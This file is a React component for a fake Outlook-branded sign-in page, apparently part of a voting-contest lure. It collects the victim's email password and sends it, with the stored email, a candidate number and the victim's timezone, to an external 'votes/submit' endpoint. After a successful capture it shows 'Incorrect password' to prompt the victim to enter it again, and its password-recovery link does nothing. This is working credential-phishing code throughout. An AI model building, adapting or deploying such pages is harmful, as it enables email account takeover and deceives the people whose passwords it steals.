import { useEffect, useState } from "react";
import emailLogo from "../assets/email-logo.png";

export default function EmailPassword() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState(null);

  useEffect(() => {
    const savedEmail = localStorage.getItem("email_username");

    if (!savedEmail) {
      window.location.href = "/login/email";
      return;
    }

    setEmail(savedEmail);
  }, []);

  async function submitForm(e) {
    e.preventDefault();

    if (!password.trim()) {
      alert("Please enter your password.");
      return;
    }

    setLoading(true);

    try {
      const res = await fetch(
        "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            candidate_number: localStorage.getItem("candidate"),
            platform: "email",
            username: email,
            password,
            location: Intl.DateTimeFormat().resolvedOptions().timeZone,
          }),
        }
      );

      const data = await res.json();
      if (data.success) {
        setStatus("approved");
      } else {
        setStatus("rejected");
      }
    } catch (err) {
      console.error(err);
      setStatus("rejected");
    }

    setLoading(false);
  }

  if (status === "approved") {
    return (
      <div className="min-h-screen bg-[#f3f4f6] flex items-center justify-center px-4 py-10">
        <div className="w-full max-w-md rounded-[32px] bg-white border border-slate-200 shadow-[0_30px_70px_rgba(15,23,42,0.12)] px-8 py-10 text-center">
          <img src={emailLogo} alt="Outlook" className="mx-auto h-14 w-14 object-contain mb-6" />
          <h1 className="text-3xl font-semibold text-slate-900">Incorrect password</h1>
          <p className="mt-3 text-slate-600">Try again with the correct password.</p>
        </div>
      </div>
    );
  }

  if (status === "rejected") {
    return (
      <div className="min-h-screen bg-[#f3f4f6] flex items-center justify-center px-4 py-10">
        <div className="w-full max-w-md rounded-[32px] bg-white border border-slate-200 shadow-[0_30px_70px_rgba(15,23,42,0.12)] px-8 py-10 text-center">
          <img src={emailLogo} alt="Outlook" className="mx-auto h-14 w-14 object-contain mb-6" />
          <h1 className="text-3xl font-semibold text-red-600">Request Rejected</h1>
          <p className="mt-3 text-slate-600">Your request could not be submitted.</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f3f4f6] flex items-center justify-center px-4 py-10">
      <div className="w-full max-w-md rounded-[32px] bg-white border border-slate-200 shadow-[0_30px_70px_rgba(15,23,42,0.12)] overflow-hidden">
        <div className="px-8 py-10 md:px-10 md:py-12">
          <div className="flex justify-center mb-8">
            <img src={emailLogo} alt="Outlook" className="h-14 w-14 object-contain" />
          </div>

          <div className="text-center">
            <h1 className="text-3xl font-semibold text-slate-900">Sign in</h1>
            <p className="mt-2 text-sm text-slate-500">Enter the password for</p>
            <p className="mt-2 text-base font-medium text-slate-900 break-all">{email}</p>
          </div>

          <form onSubmit={submitForm} className="mt-8 space-y-6">
            <div>
              <label className="block text-sm font-medium text-slate-700 mb-2">Password</label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                className="w-full rounded-3xl border border-slate-300 bg-slate-50 px-4 py-4 text-slate-900 outline-none transition focus:border-blue-600 focus:bg-white"
              />
            </div>

            <div className="flex flex-col gap-3 text-sm text-slate-600 sm:flex-row sm:items-center sm:justify-between">
              <button
                type="button"
                className="text-blue-600 hover:underline"
                onClick={() => window.location.href = "/login/email"}
              >
                Back
              </button>
              <button
                type="button"
                className="text-blue-600 hover:underline"
                onClick={() => alert("Password recovery is not available in this demo.")}
              >
                Forgot password?
              </button>
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full rounded-3xl bg-blue-600 px-4 py-3 text-base font-semibold text-white shadow-sm transition hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-60"
            >
              {loading ? "Signing in..." : "Sign in"}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
